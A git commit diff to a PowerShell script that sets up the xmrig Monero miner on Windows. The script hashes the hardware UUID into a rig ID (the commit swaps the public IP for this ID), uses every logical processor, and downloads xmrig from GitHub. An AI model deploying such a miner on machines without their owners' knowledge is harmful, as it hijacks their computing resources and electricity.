98484f153af34945128fee7c91eb346f4a2620d3
MomboteQ <60738939+MomboteQ@users.noreply.github.com>
2025-02-08 15:06:49 +0100

    Update windows.ps1

--- monero/windows.ps1
+++ monero/windows.ps1
@@ -6,7 +6,7 @@ $uuid = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID.Replace("-", "
 $hash = (New-Object System.Security.Cryptography.SHA256Managed).ComputeHash([System.Text.Encoding]::UTF8.GetBytes($uuid))
 $numericId = [BitConverter]::ToUInt32($hash, 0) % 1000000000000
 
-$pass = "Rig-w-$publicIP"
+$pass = "Rig-w-$numericId"
 $threads = (Get-CimInstance -ClassName Win32_Processor).NumberOfLogicalProcessors
 
 Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip" -OutFile "xmrig.zip"
